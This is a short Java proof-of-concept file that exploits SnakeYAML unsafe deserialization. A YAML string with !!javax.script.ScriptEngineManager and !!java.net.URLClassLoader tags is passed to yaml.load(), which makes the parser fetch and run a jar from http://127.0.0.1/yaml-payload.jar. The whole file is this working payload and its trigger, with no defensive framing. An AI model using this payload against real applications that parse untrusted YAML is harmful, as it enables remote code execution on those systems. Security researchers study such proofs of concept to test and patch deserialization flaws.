package point_yaml;

import org.yaml.snakeyaml.Yaml;

public class Main {
    public static void main(String[] args) {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}